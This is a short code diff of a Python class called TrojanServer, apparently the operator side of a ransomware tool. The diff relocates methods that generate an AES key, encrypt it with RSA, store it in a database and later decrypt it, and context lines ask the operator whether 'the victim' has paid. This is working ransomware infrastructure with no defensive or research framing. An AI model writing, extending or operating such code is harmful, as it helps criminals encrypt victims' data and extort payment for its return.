@@ -112,6 +112,19 @@ class TrojanServer:
             has_paid = input("is the victim paid? [yes/no]\your answer:   ")
             if has_paid == "yes":
                 paid = True
+                
+    def _generate_and_store_aes_key(self):
+        word = self.keys._get_random_word()
+        aes_key = self.keys._generate_aes_key_from_secret_word(word)
+        encrypted = self.keys._encrypt_aes_key_with_rsa(aes_key)
+        self.db._save_aes_key_in_database(encrypted)
+        return aes_key
+
+    def _retrieve_aes_key(self):
+        encrypted_key = self.db._get_last_aes_key_from_database()
+        aes_key = self.keys._decrypt_aes_key_with_rsa(encrypted_key)
+        return aes_key
+    
     def handle_client(self):
         # option 1:
         
@@ -152,18 +165,6 @@ class TrojanServer:
         decoded_msg = msg.decode()
         print(decoded_msg)
         
-
-    def _generate_and_store_aes_key(self):
-        word = self.keys._get_random_word()
-        aes_key = self.keys._generate_aes_key_from_secret_word(word)
-        encrypted = self.keys._encrypt_aes_key_with_rsa(aes_key)
-        self.db._save_aes_key_in_database(encrypted)
-        return aes_key
-
-    def _retrieve_aes_key(self):
-        encrypted_key = self.db._get_last_aes_key_from_database()
-        aes_key = self.keys._decrypt_aes_key_with_rsa(encrypted_key)
-        return aes_key
     
     
 if __name__ == "__main__":
